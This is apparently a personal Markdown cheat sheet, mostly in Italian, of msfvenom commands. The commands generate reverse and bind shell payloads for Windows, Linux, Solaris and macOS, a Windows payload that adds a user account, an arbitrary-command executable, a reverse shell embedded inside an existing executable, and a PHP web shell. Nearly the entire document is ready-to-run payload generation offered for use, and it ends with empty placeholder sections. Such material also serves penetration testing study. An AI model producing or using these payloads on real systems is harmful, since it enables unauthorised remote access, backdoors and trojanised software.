# MSFVENOM

#### Serve per creare shell 
[CheatSheet 1 - MSFVenom ](https://github.com/frizb/MSF-Venom-Cheatsheet)<br>


## Windows

### Reverse Shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP Address} LPORT={Porta} -f exe > {nomefile}.exe
```

### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST={IP Address} LPORT={Port} -f exe > {nomefile}.exe
```

### Crea un user
```bash
msfvenom -p windows/adduser USER={nome utente} PASS={password} -f exe > {nomefile}.exe
```

### CMD SHELL

```bash
msfvenom -p windows/shell/reverse_tcp LHOST={IP Address} LPORT={Port} -f exe > {nomefile}.exe
```

### Execute Command
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="{comando}" -f exe > {nomefile}.exe
```
{comando} si puo intendere sia powershell specificandolo con "powershell \'{vari comandi}'"  oppure la normale cmd di windows (se avrò voglia vi metto qualche cosa di powershell e cmd di windows)

### Embedded inside executable(unire la shell ad un file)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -x {path eseguibile che vuoi unire} -f exe -o {nomefile}.exe
```

## Linux

### Reverse Shell
#### x86 
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={Port} -f elf > {nomefile}.elf
```
#### x64
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={Port} -f elf > {nomefile}.elf
```

### BIND SHELL
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={IP} LPORT={Port} -f elf > {nomefile}.elf
```

## SunOS(Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST={IP}  LPORT={Port} -f elf -e x86/shikata_ga_nai -b '\x00' > {nomefile}.elf
```

## MAC

### Reverse Shell
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={Port} -f macho > {nomefile}.macho
```

### Bind Shell
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST={IP}  LPORT={Port} -f macho > {nomefile}.macho
```

## Web Based Shell

### PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST={IP}  LPORT={Port}  -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### 
```bash

```

### 
```bash

```

### 
```bash

```